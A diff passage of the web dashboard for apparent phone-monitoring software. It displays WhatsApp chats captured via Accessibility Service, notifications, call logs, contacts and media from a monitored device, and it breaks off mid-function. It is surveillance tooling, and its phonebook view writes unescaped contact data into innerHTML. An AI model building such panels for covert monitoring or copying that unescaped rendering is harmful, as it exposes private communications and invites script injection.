@@ -4,10 +4,1124 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Guardian Dashboard</title>
-    <script type="module" crossorigin src="/assets/index-iy_b1iac.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-C1-Rwmhc.css">
-  </head>
+    <script type="module" crossorigin src="/assets/index-Xe8jKuP5.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-CMcrw2BA.css">
+    <style>
+      #guardian-source-filter {
+        background: #1e293b;
+        color: #e2e8f0;
+        border: 1px solid #334155;
+        border-radius: 6px;
+        padding: 4px 10px;
+        font-size: 12px;
+        cursor: pointer;
+        outline: none;
+        margin-right: 6px;
+        height: 30px;
+      }
+      #guardian-source-filter:focus { border-color: #3b82f6; }
+      #guardian-source-filter option { background: #1e293b; color: #e2e8f0; }
+
+      /* WhatsApp panel */
+      #wa-panel {
+        display: none;
+        flex-direction: column;
+        flex: 1;
+        min-height: 0;
+        overflow: hidden;
+      }
+      #wa-tab.active { color: #22c55e !important; border-bottom-color: #22c55e !important; }
+      .wa-toolbar {
+        padding: 10px 16px;
+        background: #1e293b;
+        border-bottom: 1px solid #334155;
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        flex-shrink: 0;
+        flex-wrap: wrap;
+      }
+      .wa-toolbar input, .wa-toolbar select {
+        background: #0f172a;
+        border: 1px solid #334155;
+        border-radius: 6px;
+        padding: 6px 10px;
+        color: #e2e8f0;
+        font-size: 12px;
+        outline: none;
+        min-width: 0;
+      }
+      .wa-toolbar input { flex: 1; min-width: 120px; }
+      .wa-toolbar input:focus, .wa-toolbar select:focus { border-color: #3b82f6; }
+      .wa-toolbar select option { background: #0f172a; }
+      .wa-ticker { font-size: 11px; color: #475569; margin-left: auto; white-space: nowrap; }
+      #wa-msgs { flex: 1; overflow-y: auto; padding: 16px; }
+      .wa-msg {
+        background: #1e293b;
+        border: 1px solid #334155;
+        border-radius: 8px;
+        padding: 10px 14px;
+        margin-bottom: 8px;
+      }
+      .wa-msg-head {
+        display: flex;
+        align-items: baseline;
+        gap: 8px;
+        margin-bottom: 4px;
+        flex-wrap: wrap;
+      }
+      .wa-chat { font-size: 12px; font-weight: 600; color: #22c55e; }
+      .wa-who { font-size: 12px; color: #94a3b8; }
+      .wa-out .wa-who { color: #60a5fa; }
+      .wa-time { font-size: 11px; color: #475569; margin-left: auto; }
+      .wa-body { font-size: 14px; color: #e2e8f0; line-height: 1.5; word-break: break-word; }
+      .wa-hint { color: #475569; font-size: 13px; padding: 40px 16px; text-align: center; line-height: 1.8; }
+    </style>
+    <script>
+  /* Auth gate: redirect unauthenticated users to login before React loads */
+  (function(){
+    "use strict";
+    var x = new XMLHttpRequest();
+    x.open("GET", "/api/session", false);
+    try { x.send(); } catch(e) {}
+    var ok = false;
+    try { ok = JSON.parse(x.responseText).authenticated === true; } catch(e) {}
+    if (!ok) { window.location.replace("/"); }
+  })();
+  </script>
+</head>
   <body>
     <div id="root"></div>
+    <script>
+(function () {
+  "use strict";
+
+  // ── Intercept fetch to track active deviceId ─────────────────────────────────
+  // ── Intercept fetch: track active deviceId + paginate media ─────────────────
+  var activeDeviceId = null;
+  var _mediaPag = { page: 1, totalPages: 1, total: 0, limit: 50, deviceId: null, filters: '' };
+  var _origFetch = window.fetch;
+  window.fetch = function (url, opts) {
+    if (typeof url === "string") {
+      var _m = url.match(/\/api\/devices\/([^/?#]+)/);
+      if (_m) activeDeviceId = _m[1];
+
+      // ── Media pagination (backend) ──────────────────────────────────────────
+      var _mm = url.match(/^\/api\/devices\/([^/?#]+)\/media(\?[^#]*)?$/);
+      if (_mm) {
+        var _did = _mm[1], _qs = _mm[2] ? _mm[2].slice(1) : '';
+        var _p = new URLSearchParams(_qs);
+        var _fk = Array.from(_p.entries())
+          .filter(function(e) { return e[0] !== 'page' && e[0] !== 'limit'; })
+          .sort(function(a, b) { return a[0] < b[0] ? -1 : 1; })
+          .map(function(e) { return e[0] + '=' + e[1]; }).join('&');
+        if (_did !== _mediaPag.deviceId || _fk !== _mediaPag.filters) {
+          _mediaPag.page = 1; _mediaPag.deviceId = _did; _mediaPag.filters = _fk;
+        }
+        _p.set('page', _mediaPag.page); _p.set('limit', _mediaPag.limit);
+        var _nu = '/api/devices/' + _did + '/media?' + _p.toString();
+        return _origFetch(_nu, opts).then(function(resp) {
+          if (!resp.ok) return resp;
+          return resp.json().then(function(data) {
+            if (data && !Array.isArray(data) && Array.isArray(data.items)) {
+              _mediaPag.totalPages = Math.max(1, data.totalPages || 1);
+              _mediaPag.total = data.total || 0;
+              setTimeout(ensureMediaPag, 200);
+              return new Response(JSON.stringify(data.items), {
+                status: resp.status, statusText: resp.statusText,
+                headers: { 'Content-Type': 'application/json' }
+              });
+            }
+            return new Response(JSON.stringify(data), {
+              status: resp.status, statusText: resp.statusText,
+              headers: { 'Content-Type': 'application/json' }
+            });
+          }).catch(function() { return _origFetch(_nu, opts); });
+        });
+      }
+    }
+    return _origFetch.apply(this, arguments);
+  };
+
+  // ── Source filter dropdown ───────────────────────────────────────────────────
+  var SOURCES = [
+    { value: "all",               label: "All Sources",       match: function () { return true; } },
+    { value: "whatsapp",          label: "WhatsApp",          match: function (c) { return c === "WhatsApp"; } },
+    { value: "whatsapp_business", label: "WhatsApp Business", match: function (c) { return c === "WhatsApp Business"; } },
+    { value: "sms",               label: "SMS",               match: function (c) { return /^(messages?|messaging|samsung messages?|sms|mms|textra|signal)$/i.test(c); } },
+    { value: "calls",             label: "Calls",             match: function (c, t) { return /phone|dialer|call/i.test(c) && !/missed/i.test(t); } },
+    { value: "missed_calls",      label: "Missed Calls",      match: function (c, t) { return /phone|dialer|call/i.test(c) && /missed/i.test(t); } },
+    { value: "system_ui",         label: "System UI",         match: function (c) { return /^(system ui|android system|systemui)$/i.test(c); } },
+    { value: "android_auto",      label: "Android Auto",      match: function (c) { return /android auto/i.test(c); } },
+    { value: "google",            label: "Google",            match: function (c) { return /^(google|gmail|google search|google maps|maps|youtube|chrome|google keep|google photos|google play|google pay|google messages)$/i.test(c); } },
+    { value: "other",             label: "App Notifications", match: function (c) { return !/^(whatsapp|messages?|messaging|samsung messages?|sms|mms|phone|dialer|call|system ui|android system|android auto|google|gmail|google search|maps|youtube|chrome)$/i.test(c); } }
+  ];
+  var currentSource = "all";
+
+  function applySourceFilter() {
+    var ul = document.querySelector("ul.messages");
+    if (!ul) return;
+    var src = SOURCES.filter(function (s) { return s.value === currentSource; })[0] || SOURCES[0];
+    ul.querySelectorAll("li.msg").forEach(function (li) {
+      var chip = (li.querySelector(".app-chip") || {}).textContent || "";
+      var text = (li.querySelector(".msg-text") || {}).textContent || "";
+      li._srcHidden = !src.match(chip.trim(), text.trim());
+    });
+    _msgPage = 1;
+    applyMsgPagination();
+  }
+
+  function makeSourceDropdown() {
+    var sel = document.createElement("select");
+    sel.id = "guardian-source-filter";
+    sel.setAttribute("aria-label", "Filter by source");
+    SOURCES.forEach(function (s) {
+      var o = document.createElement("option");
+      o.value = s.value; o.textContent = s.label;
+      if (s.value === currentSource) o.selected = true;
+      sel.appendChild(o);
+    });
+    sel.onchange = function (e) { currentSource = e.target.value; applySourceFilter(); };
+    return sel;
+  }
+
+  // ── WhatsApp messages panel ──────────────────────────────────────────────────
+  var waConv = "", waSearch = "", waPollTimer = null, waActive = false;
+
+  function esc(s) {
+    return String(s || "").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+  }
+  function fmtTime(ms) {
+    var n = Number(ms);
+    if (!n) return "";
+    var d = new Date(n);
+    return isNaN(d) ? "" : d.toLocaleString(undefined, {month:"short",day:"numeric",hour:"2-digit",minute:"2-digit"});
+  }
+
+  function buildWaPanel() {
+    var wrap = document.createElement("div");
+    wrap.id = "wa-panel";
+
+    var tb = document.createElement("div");
+    tb.className = "wa-toolbar";
+
+    var inp = document.createElement("input");
+    inp.id = "wa-search-inp"; inp.type = "text"; inp.placeholder = "Search messages…";
+    inp.oninput = function () { waSearch = inp.value; clearTimeout(waPollTimer); waPollTimer = setTimeout(refreshWa, 300); };
+
+    var sel = document.createElement("select");
+    sel.id = "wa-conv-sel";
+    sel.innerHTML = '<option value="">All conversations</option>';
+    sel.onchange = function () { waConv = sel.value; refreshWa(); };
+
+    var tick = document.createElement("span");
+    tick.className = "wa-ticker"; tick.id = "wa-tick"; tick.textContent = "auto-refresh 10s";
+
+    tb.appendChild(inp); tb.appendChild(sel); tb.appendChild(tick);
+
+    var msgs = document.createElement("div");
+    msgs.id = "wa-msgs";
+    msgs.innerHTML = '<div class="wa-hint">Select a device from the sidebar to view captured WhatsApp messages.</div>';
+
+    wrap.appendChild(tb); wrap.appendChild(msgs);
+    return wrap;
+  }
+
+  function refreshWa() {
+    var did = activeDeviceId;
+    if (!did) {
+      var el = document.getElementById("wa-msgs");
+      if (el) el.innerHTML = '<div class="wa-hint">Select a device from the sidebar, then click <strong>WhatsApp</strong> again.</div>';
+      return;
+    }
+    var parts = [];
+    if (waSearch.trim()) parts.push("q=" + encodeURIComponent(waSearch.trim()));
+    if (waConv) parts.push("chat=" + encodeURIComponent(waConv));
+    var url = "/api/devices/" + did + "/chats" + (parts.length ? "?" + parts.join("&") : "");
+    var el = document.getElementById("wa-msgs");
+
+    _origFetch(url, { credentials: "include" }).then(function (r) {
+      if (r.status === 401 || r.status === 403) { window.location.href = "/"; return null; }
+      return r.ok ? r.json() : null;
+    }).then(function (msgs) {
+      if (!msgs || !el) return;
+      var tick = document.getElementById("wa-tick");
+      if (tick) tick.textContent = msgs.length + " msg" + (msgs.length !== 1 ? "s" : "") + " • " + new Date().toLocaleTimeString(undefined, {hour:"2-digit",minute:"2-digit",second:"2-digit"});
+      if (!msgs.length) {
+        el.innerHTML = '<div class="wa-hint">No WhatsApp messages captured yet.<br>Make sure Accessibility Service is enabled and open a WhatsApp chat on the device.</div>';
+        return;
+      }
+      el.innerHTML = msgs.map(function (m) {
+        var out = m.sender === "Me";
+        return '<div class="wa-msg' + (out ? " wa-out" : "") + '">' +
+          '<div class="wa-msg-head">' +
+          '<span class="wa-chat">' + esc(m.chatName || "Unknown") + '</span>' +
+          '<span class="wa-who">' + esc(out ? "You" : (m.sender || "")) + '</span>' +
+          '<span class="wa-time">' + fmtTime(m.messageAt) + '</span></div>' +
+          '<div class="wa-body">' + esc(m.text || "") + '</div></div>';
+      }).join("");
+    }).catch(function () {});
+
+    // Refresh conversations list
+    _origFetch("/api/devices/" + did + "/chats/conversations", { credentials: "include" })
+      .then(function (r) { return r.ok ? r.json() : null; })
+      .then(function (convs) {
+        if (!convs) return;
+        var s = document.getElementById("wa-conv-sel");
+        if (!s) return;
+        var cur = s.value;
+        s.innerHTML = '<option value="">All conversations (' + convs.reduce(function (a, c) { return a + c.count; }, 0) + ')</option>';
+        convs.forEach(function (c) {
+          var o = document.createElement("option");
+          o.value = c.chatName || "";
+          o.textContent = esc(c.chatName || "Unknown") + " (" + c.count + ")";
+          if (c.chatName === cur) o.selected = true;
+          s.appendChild(o);
+        });
+      }).catch(function () {});
+  }
+
+  function startWaPoll() {
+    stopWaPoll();
+    refreshWa();
+    waPollTimer = setInterval(refreshWa, 10000);
+  }
+  function stopWaPoll() {
+    if (waPollTimer) { clearInterval(waPollTimer); waPollTimer = null; }
+  }
+
+  function showWaPanel() {
+    waActive = true;
+    var panel = document.getElementById("wa-panel");
+    if (!panel) return;
+    // Hide all React-rendered content in .feed except .tabs and #wa-panel
+    var feed = panel.parentElement;
+    if (feed) {
+      Array.prototype.forEach.call(feed.children, function (ch) {
+        if (ch.id !== "wa-panel" && !ch.classList.contains("tabs")) {
+          ch.style.display = "none";
+          ch._waHidden = true;
+        }
+      });
+    }
+    panel.style.display = "flex";
+    startWaPoll();
+  }
+
+  function hideWaPanel() {
+    waActive = false;
+    stopWaPoll();
+    var panel = document.getElementById("wa-panel");
+    if (!panel) return;
+    panel.style.display = "none";
+    var feed = panel.parentElement;
+    if (feed) {
+      Array.prototype.forEach.call(feed.children, function (ch) {
+        if (ch._waHidden) { ch.style.display = ""; ch._waHidden = false; }
+      });
+    }
+  }
+
+
+  // ── MetaMask wallet login ─────────────────────────────────────────────────────
+  var mmInjected = false;
+
+  function ensureMetaMaskBtn() {
+    /* Login form should not appear — auth gate already redirects unauthenticated users.
+       If a password input somehow appears (e.g. session expired mid-session), redirect. */
+    var pwInput = document.querySelector('input[type="password"]');
+    if (!pwInput) return;
+    if (mmInjected) return;
+    window.location.replace("/");
+    return;
+
+    var form = pwInput.closest('form') || pwInput.parentElement;
+    if (!form) return;
+    mmInjected = true;
+
+    var divider = document.createElement('div');
+    divider.style.cssText = 'display:flex;align-items:center;gap:12px;margin:16px 0;';
+    divider.innerHTML = '<hr style="flex:1;border:none;border-top:1px solid #334155"><span style="font-size:12px;color:#64748b;white-space:nowrap">or sign in with wallet</span><hr style="flex:1;border:none;border-top:1px solid #334155">';
+
+    var btn = document.createElement('button');
+    btn.id = 'mm-login-btn';
+    btn.type = 'button';
+    btn.style.cssText = 'width:100%;padding:10px 16px;background:#f6851b;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:4px;';
+    btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 35 33" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M32.9582 1L19.8241 10.7183L22.2665 4.99099L32.9582 1Z" fill="#E17726" stroke="#E17726" stroke-width=".25" stroke-linecap="round" stroke-linejoin="round"/><path d="M2.0582 1L15.0707 10.809L12.7503 4.99098L2.0582 1Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M28.2295 23.5335L24.7452 28.872L32.2173 30.9295L34.3674 23.6501L28.2295 23.5335Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M0.649414 23.6501L2.78292 30.9295L10.2549 28.872L6.78733 23.5335L0.649414 23.6501Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M9.85261 14.5149L7.7749 17.6507L15.1804 17.9917L14.9298 10.0745L9.85261 14.5149Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M25.1476 14.5149L20.003 9.98297L19.8241 17.9917L27.2254 17.6507L25.1476 14.5149Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M10.2549 28.872L14.7296 26.6978L10.8684 23.7002L10.2549 28.872Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M20.2705 26.6978L24.7452 28.872L24.1317 23.7002L20.2705 26.6978Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/></svg> Connect MetaMask Wallet';
+    btn.onmouseenter = function() { this.style.background = '#d97706'; };
+    btn.onmouseleave = function() { this.style.background = '#f6851b'; };
+    btn.onclick = function() { connectMetaMask(btn); };
+
+    var statusEl = document.createElement('div');
+    statusEl.id = 'mm-status';
+    statusEl.style.cssText = 'font-size:12px;text-align:center;min-height:18px;color:#94a3b8;padding:4px 0;';
+
+    form.appendChild(divider);
+    form.appendChild(btn);
+    form.appendChild(statusEl);
+  }
+
+  function setMmStatus(msg, color) {
+    var el = document.getElementById('mm-status');
+    if (el) { el.textContent = msg; el.style.color = color || '#94a3b8'; }
+  }
+
+  async function connectMetaMask(btn) {
+    if (typeof window.ethereum === 'undefined') {
+      setMmStatus('MetaMask not detected. Please install the MetaMask extension.', '#ef4444');
+      return;
+    }
+    btn.disabled = true; btn.style.opacity = '0.7';
+    try {
+      setMmStatus('Requesting wallet access…', '#94a3b8');
+      var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      if (!accounts || !accounts[0]) throw new Error('No account selected');
+      var address = accounts[0];
+
+      setMmStatus('Fetching sign-in nonce…', '#94a3b8');
+      var nonceResp = await fetch('/api/wallet/nonce?address=' + encodeURIComponent(address), { credentials: 'include' });
+      var nonceData = await nonceResp.json();
+      if (!nonceResp.ok) throw new Error(nonceData.error || 'Wallet not authorized');
+
+      setMmStatus('Please sign the message in MetaMask…', '#94a3b8');
+      var signature = await window.ethereum.request({
+        method: 'personal_sign',
+        params: [nonceData.message, address]
+      });
+
+      setMmStatus('Verifying signature…', '#94a3b8');
+      var verifyResp = await fetch('/api/wallet/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ address: address, signature: signature })
+      });
+      var verifyData = await verifyResp.json();
+      if (!verifyResp.ok) throw new Error(verifyData.error || 'Verification failed');
+
+      setMmStatus('Authenticated! Loading dashboard…', '#22c55e');
+      setTimeout(function() { window.location.reload(); }, 600);
+    } catch (err) {
+      var msg = (err && err.code === 4001) ? 'Signature request was rejected.' : (err && err.message) || 'MetaMask login failed';
+      setMmStatus(msg, '#ef4444');
+      btn.disabled = false; btn.style.opacity = '1';
+    }
+  }
+
+
+  // ── Media section pagination (backend) ──────────────────────────────────────
+  var _mediaPagBusy = false;
+  var _mediaPagLastKey = '';
+
+  function ensureMediaPag() {
+    if (_mediaPagBusy) return;
+    var wrap = document.getElementById('_mpag-media');
+    if (!wrap) {
+      wrap = document.createElement('div');
+      wrap.id = '_mpag-media';
+      wrap.style.cssText = 'position:fixed;bottom:0;left:0;width:100%;background:#0a0a1a;border-top:1px solid #2a2a4a;padding:8px 16px;z-index:9999;display:flex;gap:6px;justify-content:center;align-items:center;flex-wrap:wrap;box-sizing:border-box;';
+      _mediaPagBusy = true; document.body.appendChild(wrap); _mediaPagBusy = false;
+    }
+    var key = _mediaPag.page + '|' + _mediaPag.totalPages + '|' + _mediaPag.total;
+    if (key === _mediaPagLastKey && wrap.hasChildNodes()) return;
+    _mediaPagLastKey = key;
+    _mediaPagBusy = true; _renderPag(wrap, _mediaPag, _goMpag); _mediaPagBusy = false;
+  }
+
+
+  // ── Media type tabs (replace type <select> with tab buttons) ─────────────────
+  var _mediaTabActive = '';
+  var _MEDIA_TABS = [
+    { label: 'All Media', value: '' },
+    { label: 'Photos',    value: 'image' },
+    { label: 'Videos',    value: 'video' },
+    { label: 'Audio',     value: 'audio' },
+    { label: 'Documents', value: 'document' }
+  ];
+  var _mtabOff = 'background:#1a1a3a;border:1px solid #3a3a6a;color:#a0a0cc;padding:6px 16px;border-radius:4px;cursor:pointer;font-size:13px;white-space:nowrap;';
+  var _mtabOn  = 'background:#3a3a8a;border:1px solid #6a6aaa;color:#fff;padding:6px 16px;border-radius:4px;cursor:pointer;font-size:13px;white-space:nowrap;';
+
+  function _getTypeSelect() {
+    var sels = document.querySelectorAll('div.media-filters select');
+    for (var i = 0; i < sels.length; i++) {
+      if (sels[i].querySelector('option[value="image"]')) return sels[i];
+    }
+    return null;
+  }
+
+  function _setMediaType(val) {
+    _mediaTabActive = val;
+    var sel = _getTypeSelect();
+    if (sel) {
+      var setter = Object.getOwnPropertyDescriptor(HTMLSelectElement.prototype, 'value');
+      if (setter && setter.set) setter.set.call(sel, val);
+      sel.dispatchEvent(new Event('change', { bubbles: true }));
+    }
+    document.querySelectorAll('#_media-tabs [data-mtype]').forEach(function(b) {
+      b.style.cssText = b.getAttribute('data-mtype') === val ? _mtabOn : _mtabOff;
+    });
+  }
+
+  function ensureMediaTabs() {
+    var mf = document.querySelector('div.media-filters');
+    if (!mf) return;
+
+    var sel = _getTypeSelect();
+    if (sel) {
+      // Sync active tab if React reset the select (e.g. device switch)
+      if (sel.value !== _mediaTabActive) {
+        _mediaTabActive = sel.value;
+        document.querySelectorAll('#_media-tabs [data-mtype]').forEach(function(b) {
+          b.style.cssText = b.getAttribute('data-mtype') === _mediaTabActive ? _mtabOn : _mtabOff;
+        });
+      }
+      sel.style.display = 'none';
+    }
+
+    if (document.getElementById('_media-tabs')) return;
+
+    var wrap = document.createElement('div');
+    wrap.id = '_media-tabs';
+    wrap.style.cssText = 'display:flex;gap:6px;flex-wrap:wrap;padding:4px 0 10px 0;';
+
+    _MEDIA_TABS.forEach(function(tab) {
+      var btn = document.createElement('button');
+      btn.textContent = tab.label;
+      btn.setAttribute('data-mtype', tab.value);
+      btn.style.cssText = tab.value === _mediaTabActive ? _mtabOn : _mtabOff;
+      (function(v) {
+        btn.onclick = function(ev) { ev.stopPropagation(); _setMediaType(v); };
+      })(tab.value);
+      wrap.appendChild(btn);
+    });
+
+    mf.parentNode.insertBefore(wrap, mf);
+  }
+
+  // ── Messages section pagination (DOM-based, client-side) ─────────────────────
+  var _msgPage = 1;
+  var _msgPageSize = 100;
+  var _msgPag2 = { page: 1, totalPages: 1, total: 0, limit: 100 };
+  var _msgPagBusy = false;
+  var _msgPagLastKey = '';
+  var _msgPagApplyBusy = false;
+  var _lastMsgItemCount = -1;
+
+  function applyMsgPagination() {
+    if (_msgPagApplyBusy) return;
+    var bar = document.querySelector('.msg-filter-bar');
+    if (!bar) return;
+    var ul = document.querySelector('ul.messages');
+    if (!ul) return;
+
+    _msgPagApplyBusy = true;
+
+    var allItems = Array.from(ul.querySelectorAll('li.msg'));
+    var visItems = allItems.filter(function(li) { return !li._srcHidden; });
+
+    var total = visItems.length;
+    var totalPages = Math.max(1, Math.ceil(total / _msgPageSize));
+    if (_msgPage > totalPages) _msgPage = 1;
+
+    var start = (_msgPage - 1) * _msgPageSize;
+    var end = start + _msgPageSize;
+    var pageSet = new Set(visItems.slice(start, end));
+
+    allItems.forEach(function(li) {
+      li.style.display = (li._srcHidden || !pageSet.has(li)) ? 'none' : '';
+    });
+
+    _msgPag2.page = _msgPage;
+    _msgPag2.totalPages = totalPages;
+    _msgPag2.total = total;
+    _msgPagLastKey = '';
+
+    _msgPagApplyBusy = false;
+
+    ensureMsgPag();
+  }
+
+  function ensureMsgPag() {
+    if (_msgPagBusy) return;
+    var bar = document.querySelector('.msg-filter-bar');
+    var ul = document.querySelector('ul.messages');
+    var wrap = document.getElementById('_mpag-msgs');
+    if (!bar || !ul) { if (wrap) wrap.style.display = 'none'; return; }
+    if (wrap) wrap.style.display = 'flex';
+    if (!wrap || wrap.previousElementSibling !== ul) {
+      if (wrap) { _msgPagBusy = true; wrap.parentNode.removeChild(wrap); _msgPagBusy = false; }
+      wrap = document.createElement('div');
+      wrap.id = '_mpag-msgs';
+      wrap.style.cssText = 'display:flex;align-items:center;justify-content:center;gap:6px;padding:16px;flex-wrap:wrap;border-top:1px solid #334155;margin-top:4px;';
+      _msgPagBusy = true; ul.parentNode.insertBefore(wrap, ul.nextSibling); _msgPagBusy = false;
+    }
+    var key = _msgPag2.page + '|' + _msgPag2.totalPages + '|' + _msgPag2.total;
+    if (key === _msgPagLastKey && wrap.hasChildNodes()) return;
+    _msgPagLastKey = key;
+    _msgPagBusy = true; _renderPag(wrap, _msgPag2, _goMsgPag); _msgPagBusy = false;
+  }
+
+  // ── Shared paginator renderer ─────────────────────────────────────────────────
+
+  function _pagNums(cur, total) {
+    if (total <= 7) { var a = []; for (var i = 1; i <= total; i++) a.push(i); return a; }
+    var pages = [1];
+    if (cur > 3) pages.push('...');
+    var lo = Math.max(2, cur - 1), hi = Math.min(total - 1, cur + 1);
+    for (var i = lo; i <= hi; i++) pages.push(i);
+    if (cur < total - 2) pages.push('...');
+    pages.push(total); return pages;
+  }
+
+
+  function _renderPag(wrap, state, goFn) {
+    while (wrap.firstChild) wrap.removeChild(wrap.firstChild);
+    if (state.totalPages <= 1) { wrap.style.display = 'none'; return; }
+    wrap.style.display = 'flex';
+    var bs = 'background:#1a1a3a;border:1px solid #3a3a6a;color:#a0a0cc;padding:4px 10px;border-radius:4px;cursor:pointer;font-size:12px;min-width:28px;';
+    var as_ = bs + 'background:#3a3a8a;color:#fff;border-color:#6a6aaa;';
+    var prev = document.createElement('button');
+    prev.textContent = '‹';
+    prev.style.cssText = bs;
+    prev.disabled = state.page <= 1;
+    if (state.page <= 1) prev.style.opacity = '0.4';
+    prev.onclick = function(ev) { ev.stopPropagation(); goFn(state.page - 1); };
+    wrap.appendChild(prev);
+    _pagNums(state.page, state.totalPages).forEach(function(n) {
+      var el = document.createElement('button');
+      if (n === '...') { el.textContent = '…'; el.style.cssText = bs; el.disabled = true; }
+      else {
+        el.textContent = String(n);
+        el.style.cssText = n === state.page ? as_ : bs;
+        (function(pg) { el.onclick = function(ev) { ev.stopPropagation(); goFn(pg); }; })(n);
+      }
+      wrap.appendChild(el);
+    });
+    var next = document.createElement('button');
+    next.textContent = '›';
+    next.style.cssText = bs;
+    next.disabled = state.page >= state.totalPages;
+    if (state.page >= state.totalPages) next.style.opacity = '0.4';
+    next.onclick = function(ev) { ev.stopPropagation(); goFn(state.page + 1); };
+    wrap.appendChild(next);
+    var info = document.createElement('span');
+    info.textContent = 'Page ' + state.page + ' of ' + state.totalPages + ' (' + state.total + ')';
+    info.style.cssText = 'color:#6a6a9a;font-size:11px;margin-left:8px;';
+    wrap.appendChild(info);
+  }
+
+  function _goMpag(page) {
+    if (page < 1 || page > _mediaPag.totalPages) return;
+    _mediaPag.page = page;
+    _mediaPagLastKey = '';
+    var did = activeDeviceId;
+    if (!did) return;
+    var params = new URLSearchParams();
+    if (_mediaPag.filters) {
+      _mediaPag.filters.split('&').forEach(function(p) {
+        var kv = p.split('=');
+        if (kv[0]) params.set(kv[0], decodeURIComponent(kv[1] || ''));
+      });
+    }
+    fetch('/api/devices/' + did + '/media?' + params.toString());
+  }
+
+  function _goMsgPag(page) {
+    if (page < 1 || page > _msgPag2.totalPages) return;
+    _msgPage = page;
+    _msgPagLastKey = '';
+    applyMsgPagination();
+  }
+
+  function _switchTab(targetText, state) {
+    var tabs = document.querySelectorAll('.tab:not(#wa-tab)');
+    var targetTab = null, otherTab = null;
+    tabs.forEach(function(t) {
+      var txt = t.textContent.trim();
+      if (txt === targetText) targetTab = t;
+      else if (!otherTab && !t.classList.contains('active')) otherTab = t;
+    });
+    if (!otherTab) tabs.forEach(function(t) { if (t !== targetTab && !otherTab) otherTab = t; });
+    if (targetTab && otherTab) {
+      otherTab.click();
+      setTimeout(function() { if (targetTab) targetTab.click(); }, 50);
+    } else if (targetTab) { targetTab.click(); }
+  }
+
+
+
+
+
+
+  // ── Phonebook tab (Contact Dump + Call History) ───────────────────────────
+  var _pbActive = false;
+  var _pbSubTab = 'contacts';
+  var _pbDeviceId = null;
+  var _pbHistory = [];
+  var _pbContacts = [];
+  var _pbTimer = null;
+
+  function _pbFmtDur(s) {
+    if (!s) return '0s';
+    var h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
+    return h > 0 ? (h + 'h ' + m + 'm ' + sec + 's') : m > 0 ? (m + 'm ' + sec + 's') : (sec + 's');
+  }
+
+  function _pbFmtTime(ms) {
+    var n = Number(ms);
+    return n ? new Date(n).toLocaleString() : '';
+  }
+
+  function _pbTypeClass(t) {
+    return t === 'incoming' ? 'call-chip-incoming' : t === 'outgoing' ? 'call-chip-outgoing' :
+           t === 'missed'   ? 'call-chip-missed'   : t === 'rejected' ? 'call-chip-rejected' :
+           t === 'blocked'  ? 'call-chip-blocked'  : '';
+  }
+
+  function _pbLoad(did) {
+    if (!did) return;
+    _pbDeviceId = did;
+    fetch('/api/devices/' + did + '/calls').then(function(r) { return r.json(); }).then(function(rows) {
+      _pbHistory = rows;
+      var map = {};
+      rows.forEach(function(c) {
+        var k = c.phoneNumber;
+        if (!map[k]) map[k] = { phoneNumber: c.phoneNumber, contactName: c.contactName || '', count: 0, lastCall: 0 };
+        map[k].count++;
+        var t = Number(c.callAt);
+        if (t > map[k].lastCall) { map[k].lastCall = t; if (c.contactName) map[k].contactName = c.contactName; }
+      });
+      var contacts = Object.keys(map).map(function(k) { return map[k]; });
+      contacts.sort(function(a, b) {
+        var an = a.contactName.toLowerCase(), bn = b.contactName.toLowerCase();
+        if (an && !bn) return -1; if (!an && bn) return 1;
+        return an < bn ? -1 : an > bn ? 1 : 0;
+      });
+      _pbContacts = contacts;
+      _pbRender();
+    }).catch(function() {});
+  }
+
+  function _pbRender() {
+    var content = document.getElementById('_pb-content');
+    if (!content || !_pbActive) return;
+    content.innerHTML = '';
+    if (_pbSubTab === 'contacts') {
+      if (_pbContacts.length === 0) {
+        content.innerHTML = '<p class="empty">No contacts found. Grant Call Log access on the monitored device to populate contact data.</p>';
+        return;
+      }
+      var ul = document.createElement('ul');
+      ul.className = 'messages';
+      _pbContacts.forEach(function(c) {
+        var li = document.createElement('li');
+        li.className = 'msg';
+        li.innerHTML =
+          '<div class="msg-head">' +
+          '<span class="app-chip">📱</span>' +
+          '<span class="sender">' + (c.contactName || c.phoneNumber) + '</span>' +
+          (c.contactName ? '<span class="group-chip">' + c.phoneNumber + '</span>' : '') +
+          '</div>' +
+          '<div class="msg-text">' + c.count + ' call' + (c.count !== 1 ? 's' : '') +
+          ' &nbsp;·&nbsp; Last: ' + _pbFmtTime(c.lastCall) + '</div>';
+        ul.appendChild(li);
+      });
+      content.appendChild(ul);
+    } else {
+      if (_pbHistory.length === 0) {
+        content.innerHTML = '<p class="empty">No call logs synced yet. Grant Call Log access on the monitored device.</p>';
+        return;
+      }
+      var ul2 = document.createElement('ul');
+      ul2.className = 'messages';
+      _pbHistory.forEach(function(c) {
+        var li2 = document.createElement('li');
+        li2.className = 'msg';
+        li2.innerHTML =
+          '<div class="msg-head">' +
+          '<span class="app-chip ' + _pbTypeClass(c.callType) + '">' + c.callType + '</span>' +
+          '<span class="sender">' + (c.contactName || c.phoneNumber) + '</span>' +
+          (c.contactName ? '<span class="group-chip">' + c.phoneNumber + '</span>' : '') +
+          '<span class="time">' + _pbFmtTime(c.callAt) + '</span>' +
+          '</div>' +
+          '<div class="msg-text">Duration: ' + _pbFmtDur(c.duration) + '</div>';
+        ul2.appendChild(li2);
+      });
+      content.appendChild(ul2);
+    }
+  }
+
+  function _buildPbPanel() {
